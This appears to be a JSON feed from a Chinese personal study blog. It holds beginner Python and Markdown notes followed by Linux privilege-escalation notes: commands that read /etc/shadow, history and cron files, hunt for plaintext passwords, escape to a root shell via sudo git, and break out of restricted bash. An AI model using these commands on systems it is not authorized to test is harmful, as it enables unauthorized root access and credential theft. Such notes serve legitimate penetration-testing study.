{
    "version": "https://jsonfeed.org/version/1",
    "title": "凌晨的信息安全之路",
    "subtitle": "Avenue-le",
    "icon": "http://avenue.cool/images/favicon.ico",
    "description": "凌晨的信息安全之路 & 随学",
    "home_page_url": "http://avenue.cool",
    "items": [
        {
            "id": "http://avenue.cool/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/",
            "url": "http://avenue.cool/Python/Python%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6/",
            "title": "3.Python进制转换、数据类型详解、类型转换、运算符",
            "date_published": "2021-02-04T15:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"整数类型操作\"><a class=\"anchor\" href=\"#整数类型操作\">#</a> 整数类型操作</h2><p>进制<br>现代的计算机和依赖计算机的设备里都用到二进制 (即 0 和 1) 来保存和表示数据，一个二进制表示一个比特 (Bit)。<br>在二进制的基础上，计算机还支持八进制和十六进制这两种进制。<br>除了计算机里的进制以外，我们生活中经常用到的是十进制。<br>Python 语言支持二进制、八进制、十六进制以及十进制的数字表示。</p><pre><code>a = 12 # 默认数字是十进制\nprint(a + 1)\nb = 0b11101   # 以0b开头的数字是二进制\nprint(b + 1)\nc = 0o12  # 以 0o 开头的数字是八进制\nprint(c + 1)\nd = 0x1A  # 以 0x 开头的数字是十六进制\nprint(d + 1)\n</code></pre><p>进制转换<br>不同进制的数字之间可以通过一定的计算规则相互转换。</p><h2 id=\"数据类型转换\"><a class=\"anchor\" href=\"#数据类型转换\">#</a> 数据类型转换</h2><pre><code>函数                         说明\nint(x [,base ])         将x转换为一个整数\nfloat(x)                将x转换为一个浮点数\nstr(x)                  将对象 x 转换为字符串\nbool(x)                 将对象x转换成为布尔值\n</code></pre><p>在 python 中，只有空字符串 '',&quot;&quot;，数字 0, 空字典 {}, 空列表 [], 空元组 (), 和空数据 None 会被转换成为 False, 其他的都会被转换成为 True</p><h2 id=\"算数运算符\"><a class=\"anchor\" href=\"#算数运算符\">#</a> 算数运算符</h2><pre><code>运算符           描述            实例\n+               加              两个对象相加 a + b 输出结果 30\n-               减              得到负数或是一个数减去另一个数 a - b 输出结果 -10\n*               乘              两个数相乘或是返回一个被重复若干次的字符串 a * b 输出结果 200\n/               除              b / a 输出结果 2\n//              取整            除返回商的整数部分 9//2 输出结果 4 , 9.0//2.0 输出结果 4.0\n%               取余            返回除法的余数 b % a 输出结果 0**指数a**b 为10的20次方， 输出结果 100000000000000000000\n()              小括号          提高运算优先级，比如: (1+2) * 3\n</code></pre><p>注意：混合运算时，优先级顺序为： ** 高于 * / % // 高于 + - ，为了避免歧义，建议使用 () 来处理运算符优先级。 并且，不同类型的数字在进行混合运算时，整数将会转换成浮点数进行运算。</p><p>如果是两个字符串做加法运算，会直接把这两个字符串拼接成一个字符串。<br>如果是数字和字符串做乘法运算，会将这个字符串重复多次。</p><h2 id=\"赋值运算符\"><a class=\"anchor\" href=\"#赋值运算符\">#</a> 赋值运算符</h2><p>・复合赋值运算符<br>运算符 描述 实例<br>+= 加法赋值运算符 c += a 等效于 c = c + a<br>-= 减法赋值运算符 c -= a 等效于 c = c - a<br>*= 乘法赋值运算符 c *= a 等效于 c = c * a<br>/= 除法赋值运算符 c /= a 等效于 c = c /a<br>//= 取整除赋值运算符 c //= a 等效于 c = c //a<br>%= 取模赋值运算符 c %= a 等效于 c = c % a<br>**= 幂赋值运算符 c **= a 等效于 c = c ** a</p><pre><code># 示例：+=\n&gt;&gt;&gt; a = 100\n&gt;&gt;&gt; a += 1  # 相当于执行 a = a + 1\n&gt;&gt;&gt; a\n101\n# 示例：*=\n&gt;&gt;&gt; a = 100\n&gt;&gt;&gt; a *= 2  # 相当于执行 a = a * 2\n&gt;&gt;&gt; a\n200\n# 示例：*=，运算时，符号右侧的表达式先计算出结果，再与左边变量的值运算\n&gt;&gt;&gt; a = 100\n&gt;&gt;&gt; a *= 1 + 2  # 相当于执行 a = a * (1+2)\n&gt;&gt;&gt; a\n300\n</code></pre><p>注意：赋值运算符是从右往左运算，将等号右边的值赋值给等号左边，所以，等号的左边一定不能是常量或者表达式。</p><h2 id=\"比较运算符\"><a class=\"anchor\" href=\"#比较运算符\">#</a> 比较运算符</h2><pre><code>以下假设变量a为10，变量b为20：\n运算符             描述                                实例\n==           等于 - 比较对象是否相等           (a == b) 返回 False.\n!=          不等于 - 比较两个对象是否不相等     (a != b) 返回 true.\n&lt;&gt;          不等于 - 比较两个对象是否不相等     (a &lt;&gt; b) 返回 true。这个运算符类似 != 。\n&gt;           大于 - 返回x是否大于y              (a &gt; b) 返回 False。\n&lt;           小于 - 返回x是否小于y。            (a &lt; b) 返回 true。\n&gt;=          大于等于 - 返回x是否大于等于y。     (a &gt;= b) 返回 False。\n&lt;=          小于等于 - 返回x是否小于等于y。     (a &lt;= b) 返回 true。\n</code></pre><p>如果是两个字符串进行比较，会将每个字符都转换成对应的编码，然后逐一进行对比。</p><pre><code>In [1]: str1='a' \nIn [2]: str2='ABC'\n# 将字符转换成为对应的编码  a对应的编码是97,A对应的编码是65\nIn [3]: str1 &gt; str2\nOut[3]: True\n</code></pre><h2 id=\"逻辑运算符\"><a class=\"anchor\" href=\"#逻辑运算符\">#</a> 逻辑运算符</h2><p>逻辑运算符</p><p>and：<br>x and y：<br>只要有一个运算数是 False，结果就是 False; 只有所有的运算数都为 True 时，结果才是 True。<br>做取值运算时，取第一个为 False 的值，如果所有的值都为 True, 取最后一个值。<br>1 and 0 and 2--&gt; 结果是 0;1 and 2 and 3--&gt; 结果是 3</p><p>or：<br>x or y：<br>只要有一个运算数是 True，结果就是 True;<br>只有所有的运算数都为 False 时，结果才是 False<br>做取值运算时，取第一个为 True 的值，如果所有的值都为 False, 取最后一个值。<br>1 or 0 or 2--&gt; 结果是 1;0 or None or () or '' or {} --&gt; 结果是 {}</p><p>not：<br>not x：<br>布尔 &quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。<br>not (a and b) 返回 False</p><h2 id=\"运算符优先级\"><a class=\"anchor\" href=\"#运算符优先级\">#</a> 运算符优先级</h2><p>当多种运算符做混合运算时，就会涉及到先运算哪个，后运算哪个问题。以下表格列出了从最高到最低优先级的所有运算符：</p><pre><code>**                      指数 (最高优先级)\n~ + -                   按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)\n* / % //                乘，除，取模和取整除\n+ -                     加法减法\n&gt;&gt; &lt;&lt;                   右移，左移运算符\n&amp;                       位 'AND'\n^ |                     位运算符\n&lt;= &lt; &gt; &gt;=               比较运算符\n&lt;&gt; == !=                等于运算符\n=%= /= //= -= += *= **=        赋值运算符\nis is not               身份运算符\nin not in               成员运算符\nnot&gt;and&gt;or              逻辑运算符\n</code></pre><p>练习：<br>``<br>print(True or False and True)<br>print(False or not False)<br>print(True or True and False)<br>a = 2<br>print(a ** 3 &gt; 5 and a + 2 &gt; 3 or a * 4 + 8 == 16 and not a == True and -a &lt; 0)</p><pre><code>\n在以后的实际开发中，如果有多种运算符进行混合运算时，强烈建议使用小括号来手动的控制运算符的优先级！</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "Python语言学习",
                "Python语言学习"
            ]
        },
        {
            "id": "http://avenue.cool/Python/Pyhton%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A/",
            "url": "http://avenue.cool/Python/Pyhton%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A/",
            "title": "2.Python中的注释",
            "date_published": "2021-02-03T14:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"注释\"><a class=\"anchor\" href=\"#注释\">#</a> 注释</h2><p>在我们工作编码的过程中，如果一段代码的逻辑比较复杂，不是特别容易理解，可以适当的添加注释，以辅助自己或者其他编码人员解读代码。</p><p>注意：注释是给程序员看的，为了让程序员方便阅读代码，解释器会忽略注释。使用自己熟悉的语言，适当的对代码进行注释说明是一种良好的编码习惯。</p><h2 id=\"注释的分类\"><a class=\"anchor\" href=\"#注释的分类\">#</a> 注释的分类</h2><p>在 Python 中支持单行注释和多行注释。</p><h3 id=\"单行注释\"><a class=\"anchor\" href=\"#单行注释\">#</a> 单行注释</h3><p>以 #开头，# 右边的所有东西当做说明，而不是真正要执行的程序，起辅助说明作用。<br># 开头右边的都是注释，解析器会忽略注释</p><p>print ('hello world') #我的作用是在控制台输出 hello world</p><h3 id=\"多行注释\"><a class=\"anchor\" href=\"#多行注释\">#</a> 多行注释</h3><p>以 ''' 开始，并以 ''' 结束，我们称之为多行注释。</p><pre><code>                               _ooOoo_\n                              o8888888o\n                              88&quot; . &quot;88\n                              (| -_- |)\n                              O\\  =  /O\n                           ____/`---'\\____\n                         .'  \\\\|     |//  `.\n                        /  \\\\|||  :  |||//  \\\n                       /  _||||| -:- |||||-  \\\n                       |   | \\\\\\  -  /// |   |\n                       | \\_|  ''\\---/''  |   |\n                       \\  .-\\__  `-`  ___/-. /\n                     ___`. .'  /--.--\\  `. . __\n                  .&quot;&quot; '&lt;  `.___\\_&lt;|&gt;_/___.'  &gt;'&quot;&quot;.\n                 | | :  `- \\`.;`\\ _ /`;.`/ - ` : | |\n                 \\  \\ `-.   \\_ __\\ /__ _/   .-` /  /\n            ======`-.____`-.___\\_____/___.-`____.-'======\n                               `=---='\n            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n                       佛祖保佑        永无BUG\n              佛曰:\n                     写字楼里写字间，写字间里程序员；\n                     程序人员写程序，又拿程序换酒钱。\n                     酒醒只在网上坐，酒醉还来网下眠；\n                     酒醉酒醒日复日，网上网下年复年。\n                     但愿老死电脑间，不愿鞠躬老板前；\n                     奔驰宝马贵者趣，公交自行程序员。\n                     别人笑我忒疯癫，我笑自己命太贱；\n                     不见满街漂亮妹，哪个归得程序员？\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "Python语言学习",
                "Python语言学习"
            ]
        },
        {
            "id": "http://avenue.cool/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/",
            "url": "http://avenue.cool/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/",
            "title": "1.Pyhton中变量名、输入、输出",
            "date_published": "2021-02-03T14:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"变量的定义\"><a class=\"anchor\" href=\"#变量的定义\">#</a> 变量的定义</h2><p>对于重复使用，并且经常需要修改的数据，可以定义为变量，来提高编程效率。<br>定义变量的语法为：变量名 = 变量值。(这里的 = 作用是赋值。)<br>定义变量后可以使用变量名来访问变量值。<br>如下示例:</p><pre><code># 不使用变量打印三次 &quot;今天天气真好&quot;,如果需要变成打印 &quot;今天天气不好&quot; 需要修改三行代码\nprint(&quot;今天天气真好&quot;)\nprint(&quot;今天天气真好&quot;)\nprint(&quot;今天天气真好&quot;)\n# 定义一个变量表示这个字符串。如果需要修改内容，只需要修改变量对应的值即可\nweather = &quot;今天天气真好&quot;\nprint(weather)  # 注意，变量名不需要使用引号包裹\nprint(weather)\nprint(weather)\n</code></pre><h2 id=\"说明\"><a class=\"anchor\" href=\"#说明\">#</a> 说明:</h2><p>・所谓变量名，可以理解为箱子，当需要使用变量值，就把对应的箱子拿来。<br>・变量即是可以变化的量，可以随时进行修改。<br>・程序就是用来处理数据的，而变量就是用来存储数据的。</p><h3 id=\"变量的类型\"><a class=\"anchor\" href=\"#变量的类型\">#</a> 变量的类型</h3><p>程序中：在 Python 里为了应对不同的业务需求，也把数据分为不同的类型。 如下图所示：<br><img data-src=\"/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/1.jpg\" alt=\"\"></p><h3 id=\"查看数据类型\"><a class=\"anchor\" href=\"#查看数据类型\">#</a> 查看数据类型</h3><p>・在 python 中，只要定义了一个变量，而且它有数据，那么它的类型就已经确定了，不需要咱们开发者主动的去说明它的类型，系统会自动辨别。也就是说在使用的时候 &quot;变量没有类型，数据才有类型&quot;。<br>・比如下面的示例里，我们没法预测变量 b 的类型，但是 a 的类型可以根据数据来确认。</p><p><img data-src=\"/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/2.jpg\" alt=\"\"></p><p>如果临时想要查看一个变量存储的数据类型，可以使用 type (变量的名字)，来查看变量存储的数据类型。</p><p><img data-src=\"/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/3.jpg\" alt=\"\"></p><h2 id=\"关键字\"><a class=\"anchor\" href=\"#关键字\">#</a> 关键字</h2><p>计算机编程语言中，标识符是用户编程时使用的名字，用于给变量、常量、函数、语句块等命名，以建立起名称与使用之间的关系。</p><h3 id=\"命名规则\"><a class=\"anchor\" href=\"#命名规则\">#</a> 命名规则</h3><ol><li>标识符由字母、下划线和数字组成，且数字不能开头。</li><li>严格区分大小写。</li><li>不能使用关键字。</li></ol><h3 id=\"命名规范\"><a class=\"anchor\" href=\"#命名规范\">#</a> 命名规范</h3><p>・标识符命名要做到顾名思义。<br>起一个有意义的名字，尽量做到看一眼就知道是什么意思 (提高代码可 读性) 比如：名字 就定义为 name , 定义学生 用 student</p><pre><code>a = &quot;zhangsan&quot;  # bad\nname = &quot;zhangsan&quot;  # good\nb = 23   # bad\nage = 23 # good\n</code></pre><p>・遵守一定的命名规范。<br>・驼峰命名法，又分为大驼峰命名法和小驼峰命名法。</p><p><img data-src=\"/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/4.jpg\" alt=\"\"></p><p>小驼峰式命名法（lower camel case）： 第一个单词以小写字母开始；第二个单词的首字母大写，例如：myName、aDog<br>大驼峰式命名法（upper camel case）： 每一个单字的首字母都采用大写字母，例如：FirstName、LastName.</p><p>还有一种命名法是用下划线 “_” 来连接所有的单词，比如 send_buf. Python 的命令规则遵循 PEP8 标准：<br><code>变量名，函数名和文件名全小写，使用下划线连接； 类名遵守大驼峰命名法； 常量名全大写；</code></p><h3 id=\"关键字-2\"><a class=\"anchor\" href=\"#关键字-2\">#</a> 关键字</h3><p>关键字的概念 一些具有特殊功能的标识符，这就是所谓的关键字。 关键字，已经被 python 官方使用了，所以不允许开发者自己定义和关键字相同名字的标识符。<br>关键字:</p><pre><code>False     None    True   and      as       assert   break     class  \ncontinue  def     del    elif     else     except   finally   for\nfrom      global  if     import   in       is       lambda    nonlocal\nnot       or      pass   raise    return   try      while     with  \nyield\n</code></pre><h2 id=\"输出语句\"><a class=\"anchor\" href=\"#输出语句\">#</a> 输出语句</h2><p>简单来说，就是将程序的运行结果显示出来。</p><pre><code>print('hello world')\n</code></pre><h3 id=\"格式化输出\"><a class=\"anchor\" href=\"#格式化输出\">#</a> 格式化输出</h3><p>格式化操作的目的<br>比如有以下代码:</p><pre><code>pirnt(&quot;我今年10岁&quot;)\npirnt(&quot;我今年11岁&quot;)\npirnt(&quot;我今年12岁&quot;)\n</code></pre><p>想一想:<br>在输出年龄的时候，用了多次 &quot;我今年 xx 岁&quot;，能否简化一下程序呢？？？</p><p>答:<br>字符串格式化</p><p>什么是格式化<br>看如下代码:</p><pre><code>age = 10\nprint(&quot;我今年%d岁&quot; % age)\n\nage += 1\nprint(&quot;我今年%d岁&quot; % age)\n\nage += 1\nprint(&quot;我今年%d岁&quot; % age)\nCopy\n在程序中，看到了%这样的操作符，这就是Python中格式化输出。\n\nage = 18\nname = &quot;xiaohua&quot;\nprint(&quot;我的姓名是%s, 年龄是%d&quot; % (name, age))\n\n</code></pre><h3 id=\"常用的格式符号\"><a class=\"anchor\" href=\"#常用的格式符号\">#</a> 常用的格式符号</h3><p>下面是完整的，它可以与％符号使用列表:</p><pre><code>格式符号\t  转换\n%%\t  输出 % 号\n%s\t  字符串\n%d\t  有符号十进制整数\n%f\t  浮点数\n%c\t  字符\n%u\t  无符号十进制整数\n%o\t  八进制整数\n%x\t  十六进制整数（小写字母0x）\n%X\t  十六进制整数（大写字母0X）\n%e\t  科学计数法（小写'e'）\n%E\t  科学计数法（大写“E”）\n%g\t  ％f和％e 的简写\n%G\t  ％f和％E的简写\n</code></pre><h3 id=\"换行输出\"><a class=\"anchor\" href=\"#换行输出\">#</a> 换行输出</h3><p>在输出的时候，如果有 \\n 那么，此时 \\n 后的内容会在另外一行显示。</p><pre><code>print(&quot;1234567890-------&quot;) # 会在一行显示\nprint(&quot;1234567890\\n-------&quot;) # 一行显示1234567890，另外一行显示-------\n</code></pre><h3 id=\"python2与python3里的区别\"><a class=\"anchor\" href=\"#python2与python3里的区别\">#</a> python2 与 python3 里的区别</h3><p>在 python3 里，print 只能使用函数的方式来调用，而在 python2 里，print 可以当做一个命令来使用。</p><pre><code>print(&quot;hello world&quot;)   # 在python2和python3里都可以使用\nprint &quot;hello world&quot;  # 这种写法只能在python2里使用，python3不再支持这种写法\n</code></pre><h2 id=\"输入语句\"><a class=\"anchor\" href=\"#输入语句\">#</a> 输入语句</h2><p>咱们在银行 ATM 机器前取钱时，肯定需要输入密码，那么怎样才能让程序知道咱们刚刚输入的是什么呢？？ 大家应该知道了，如果要完成 ATM 机取钱这件事情，需要读取用户的输入，并且使用变量保存用户输入的数据。在 Python 中，我们可以使用 input () 函数来获取用户的输入。</p><p>input<br>在 Python 中，获取键盘输入的数据的方法是采用 input 函数（至于什么是函数，咱们以后的章节中讲解），那么这个 input 怎么用呢？</p><p>看如下示例:</p><pre><code>password = input(&quot;请输入密码:&quot;)\nprint('您刚刚输入的密码是:%s' % password)\n</code></pre><h3 id=\"注意\"><a class=\"anchor\" href=\"#注意\">#</a> 注意:</h3><p>input () 的小括号中放入的是提示信息，用来在获取数据之前给用户的一个简单提示<br>input () 在从键盘获取了数据以后，会存放到等号右边的变量中<br>input () 会把用户输入的任何值都作为字符串来对待</p><h3 id=\"python2和python3区别\"><a class=\"anchor\" href=\"#python2和python3区别\">#</a> python2 和 python3 区别</h3><p>在 python2 里，如果使用 input 语句，用户输入的内容如果是一个字符串，会把这个字符串当做一个变量使用；如果输入输入的是一个数字，会把这个数字当做数字类型。如果想要输入一个字符串，需要给这个字符串加引号，或者使用 raw_input.</p><p>在 python3 里，用户输入的所有内容都会被当做字符串来存储。python3 里的 input 功能和 python2 里的 raw_input 功能一致。</p><!-- rebuild by hrmmi -->",
            "tags": [
                "Python语言学习",
                "Python语言学习"
            ]
        },
        {
            "id": "http://avenue.cool/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/",
            "url": "http://avenue.cool/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/",
            "title": "mkardown 基础语法",
            "date_published": "2021-02-03T14:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"无序列表使用-加号-空格的形式来表示\"><a class=\"anchor\" href=\"#无序列表使用-加号-空格的形式来表示\">#</a> 无序列表使用 加号 + 空格的形式来表示。</h2><p>・咖啡<br>・啤酒<br>・矿泉水<br>・白酒<br>・葡萄酒<br>・香槟酒</p><h2 id=\"每天要做的事情有序列表\"><a class=\"anchor\" href=\"#每天要做的事情有序列表\">#</a> 每天要做的事情：有序列表</h2><ol><li>起床</li><li>穿衣服</li><li>一脸刷牙</li><li>出门开车</li><li>到公司上班</li></ol><h2 id=\"使用标题\"><a class=\"anchor\" href=\"#使用标题\">#</a> 使用标题</h2><pre><code># 我是一级标题\n## 我是二级标题\n### 三级标题\n#### 四级标题\n###### 六级标题\n</code></pre><h2 id=\"加粗显示字体\"><a class=\"anchor\" href=\"#加粗显示字体\">#</a> 加粗显示字体</h2><p>使用两个 ** 号结束和开始<br><code>我是一个**很帅很帅**的帅哥。</code></p><h2 id=\"字体倾斜\"><a class=\"anchor\" href=\"#字体倾斜\">#</a> 字体倾斜：</h2><p>一个 * 结束和开始</p><h2 id=\"加粗和倾斜\"><a class=\"anchor\" href=\"#加粗和倾斜\">#</a> 加粗和倾斜：</h2><p>使用三个 *** 号开始和结束</p><h2 id=\"超链接\"><a class=\"anchor\" href=\"#超链接\">#</a> 超链接：</h2><p>[name](地址）<br><code>[百度](https://www.baidu.com)</code></p><h2 id=\"文字说明\"><a class=\"anchor\" href=\"#文字说明\">#</a> 文字说明： &gt;</h2><pre><code>&gt; 我是一段文字说明。\n</code></pre><h2 id=\"插入图片\"><a class=\"anchor\" href=\"#插入图片\">#</a> 插入图片</h2><p>![] +（图片目录 / 图片名称)<br><code>![](imgs/软件系统.png)</code></p><h2 id=\"代码书写\"><a class=\"anchor\" href=\"#代码书写\">#</a> 代码书写</h2><p>三个反引号 <code></code> 开始和结束</p><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hello world'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"不让解析的话一个反引号开始和结尾\"><a class=\"anchor\" href=\"#不让解析的话一个反引号开始和结尾\">#</a> 不让解析的话：一个反引号开始和结尾</h2><p>使用 <code>*开始，*</code> 结束，可以让字体倾斜。</p><!-- rebuild by hrmmi -->",
            "tags": [
                "Python语言学习",
                "Python语言学习"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/",
            "url": "http://avenue.cool/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/",
            "title": "Linux提权相关命令",
            "date_published": "2021-02-02T14:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"获取系统信息\"><a class=\"anchor\" href=\"#获取系统信息\">#</a> 获取系统信息</h2><pre><code>cat /etc/issue   查看发行版 \ncat /etc/*-release   查看发行版\ncat /proc/version uname -a   查看内核版本\nrpm -q kernel   红帽系统特有 \ndmesg | grep Linux\nls /boot | grep vmlinuz- \nlsb_release -a\n</code></pre><h2 id=\"检查用户权限\"><a class=\"anchor\" href=\"#检查用户权限\">#</a> 检查用户权限</h2><pre><code>sudo -l \ncat /etc/sudoers \nwhoami\n</code></pre><h2 id=\"检查密码文件\"><a class=\"anchor\" href=\"#检查密码文件\">#</a> 检查密码文件</h2><pre><code>cat /etc/passwd\ncat /etc/shadow\nls -l /etc/passwd\nls -l /etc/shadow\npasswd文件中存储了用户，shadow文件中存储的是密码的hash。出于安全的考虑，passwd是全用户可读，root可写的。而Shadow是仅root可读写的。\npasswd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。\n</code></pre><h2 id=\"查看环境变量\"><a class=\"anchor\" href=\"#查看环境变量\">#</a> 查看环境变量</h2><pre><code>搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件。\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\ncat ~/.bash_history\nenv\nset\n</code></pre><h2 id=\"检查历史文件及命令\"><a class=\"anchor\" href=\"#检查历史文件及命令\">#</a> 检查历史文件及命令</h2><pre><code>cat ~/.*_history\n</code></pre><h2 id=\"搜寻可被低权限用户使用的root权限程序\"><a class=\"anchor\" href=\"#搜寻可被低权限用户使用的root权限程序\">#</a> 搜寻可被低权限用户使用的 root 权限程序</h2><pre><code>crontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\n</code></pre><h2 id=\"检查以root权限的进程是否存在漏洞\"><a class=\"anchor\" href=\"#检查以root权限的进程是否存在漏洞\">#</a> 检查以 root 权限的进程是否存在漏洞</h2><pre><code>ps aux | grep root\nps -ef | grep root\n</code></pre><h2 id=\"搜索纯文本凭据的文件\"><a class=\"anchor\" href=\"#搜索纯文本凭据的文件\">#</a> 搜索纯文本凭据的文件</h2><pre><code>grep -ir user *\ngrep -ir pass *\n</code></pre><h2 id=\"查找可写的配置文件\"><a class=\"anchor\" href=\"#查找可写的配置文件\">#</a> 查找可写的配置文件</h2><p><code>find /etc/ -writable -type f 2&gt;/dev/null</code></p><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/linux%20%20git%20%E6%8F%90%E6%9D%83/",
            "url": "http://avenue.cool/Increase-authority/linux%20%20git%20%E6%8F%90%E6%9D%83/",
            "title": "linux  git 提权",
            "date_published": "2021-02-02T14:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><pre><code>sudo git help config \t\n!/bin/bash或者！'sh'\n\nsudo git  -p help \n!/bin/bash\n\n直接提升权限\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/",
            "url": "http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/",
            "title": "linux  rbash绕过",
            "date_published": "2021-02-02T14:30:59.000Z",
            "content_html": "<!-- build time:Fri Feb 05 2021 10:33:31 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"什么是rbash\"><a class=\"anchor\" href=\"#什么是rbash\">#</a> 什么是 rbash？</h1><p>受限 shell 是 LinuxShell 限制一些 bash shell 中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限 shell 中运行。 它为 Linux 中的 bash shell 提供了一个额外的安全层。</p><p>但以下情况是不允许 rbash 执行的：</p><ul><li>使用命令 cd 更改目录</li><li>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）</li><li>指定包含参数 '/' 的文件名</li><li>指定包含参数 ' - ' 的文件名</li><li>使用重定向输出 '&gt;', '&gt;&gt;', '&gt; |', '&lt;&gt;' '&gt;&amp;','&amp;&gt;'</li><li>大致的限制如上</li></ul><p>那么我们如果在实际环境中，如果想要对环境进行进一步的操作，那么 rbash 肯定是不符合要求的，所以才有了 “绕过” 这一行为<br>而因为 rbash 的特殊性问题，绕过的方法，大多都是通过 Linux 机器上现有的软件，来执行一个没有限制的 shell 回来使用</p><p>创建限制 shell 的用户<br>在 RHEL 和 Centos 的系统中，rbash 不能直接实现，所以在开始之前，我们需要通过 ln-s 来建立一个软连接</p><pre><code>cd  /bin\nln -s bash rbash\n</code></pre><p>然后创建用户的时候，在设置用户是以 /bin/rbash 来启动的 shell</p><p><code>useradd -s /bin/rbash hack</code></p><h1 id=\"rbash-绕过方法\"><a class=\"anchor\" href=\"#rbash-绕过方法\">#</a> rbash 绕过方法</h1><h2 id=\"bash_cmdsabinsha-把binbash给a变量\"><a class=\"anchor\" href=\"#bash_cmdsabinsha-把binbash给a变量\">#</a> BASH_CMDS [a]=/bin/sh;a #把 /bin/bash 给 a 变量</h2><pre><code>/bin/bash                  \necho $0   #查看脚本本身的名字\necho $?    #命令执行结果反馈，0代表执行成功，其余数字表示不成功\nexport PATH=$PATH:/bin/    #将/bin 作为PATH环境变量导出\nexport PATH=$PATH:/usr/bin   #将/usr/bin作为PATH环境变量导出\n</code></pre><p>执行完上面加粗的四步之后就可以执行所有命令了</p><h2 id=\"vi-命令可以使用可以使用vi-获取到一个-bash\"><a class=\"anchor\" href=\"#vi-命令可以使用可以使用vi-获取到一个-bash\">#</a> vi 命令可以使用，可以使用 vi 获取到一个 bash</h2><pre><code>vim  test\nPress ESC key\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/sbin:/usr/bin:/sbin:/bin  添加全局环境变量\n</code></pre><p>PATH 就是定义 /bin:/sbin:/usr/bin 等这些路径的变量，其中冒号为目录间的分割符。</p><h2 id=\"使用python-突破shell-限制\"><a class=\"anchor\" href=\"#使用python-突破shell-限制\">#</a> 使用 python 突破 shell 限制</h2><pre><code>python -c &quot;import os;os.system('whoami')&quot;\npython -c &quot;import os;os.system('/bin/sh')&quot;\npython -c &quot;import pty;pty.spawn('/bin/sh')&quot;\n</code></pre><h2 